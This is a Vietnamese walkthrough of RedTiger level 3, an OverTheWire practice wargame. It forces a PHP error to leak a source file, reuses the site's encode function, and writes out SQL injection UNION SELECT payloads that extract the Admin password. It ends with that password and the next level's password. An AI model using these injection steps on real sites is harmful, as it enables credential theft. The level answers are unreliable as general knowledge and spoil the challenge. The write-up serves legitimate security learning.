http://redtiger.labs.overthewire.org/level3.php
```sh
Target: Get the password of the user Admin.
Hint: Try to get an error. Tablename: level3_users


Show userdetails: 
TheCow
Admin
```

- click vô thử `TheCow` và `Admin` thì được chuyển đến trang có dạng `level3.php?usr=MDQyMjExMDE0MTgyMTQw`. Có thể thấy `usr=` biểu thì WHERE usr= và tên username đã bị mã hõa `Admin thành MDQyMjExMDE0MTgyMTQw`

- Giờ ta phải xem nó được xử lí như thế nào khi mã hóa bằng cách thêm `[]` sau usr: `level3.php?usr[]=MDQyMjExMDE0MTgyMTQw`

<img src="http://i.imgur.com/HtPGLes.jpg">

Thông báo lỗi xuất hiện `Warning: preg_match() expects parameter 2 to be string, array given in /var/www/html/hackit/urlcrypt.inc on line 25`

- Dựa vào đó ta truy cập vào `http://redtiger.labs.overthewire.org/urlcrypt.inc` để xem nó đã mã hóa như thế nào. Chúng ta được 1 trang mới chứa code PHP để mã hóa cũng như giải mã

- Bạn có thể đọc code để hiểu quá trình mã hóa. Ở đây mình chỉ lấy đoạn code mà thưck hiện quá trình **encode** thôi. Sử dụng http://www.writephponline.com/ để chạy code

```sh
function encrypt($str)
	{
		$cryptedstr = "";
		srand(3284724);
		for ($i =0; $i < strlen($str); $i++)
		{
			$temp = ord(substr($str,$i,1)) ^ rand(0, 255);
			
			while(strlen($temp)<3)
			{
				$temp = "0".$temp;
			}
			$cryptedstr .= $temp. "";
		}
		return base64_encode($cryptedstr);
	}
  ```
  
  - Tiếp theo thực hiện các bước check lỗi sql injection:
  
  1. xem số cột bị lỗi: `' UNION SELECT 1,2,3,4,5,6,7#` . Sử dụng dấu`' và #` vì để bỏ qua việc check where và comment đây là đoạn HASH vì chúng ta mã hóa mà
  
  <img src="http://i.imgur.com/UlAjGNC.jpg">
  
  2. Vậy là ở đây có 5 cột bị lỗi: `username cột 2, first name cột 6,name cột 7,icq cột 5, email cột 4`
  
  - Chúng ta sẽ lần lượt khai thác thông tin lỗi từ các cột này
  
  `' UNION SELECT 1,username,3,password,5,6,7 FROM level3_users WHERE username='Admin'#`
  
  <img src="http://i.imgur.com/0Pe47fY.jpg">
  
  Username: 	Admin
  
  Password:   thisisaverysecurepasswordEEE5rt

The password for the next level is: there_is_no_bug 
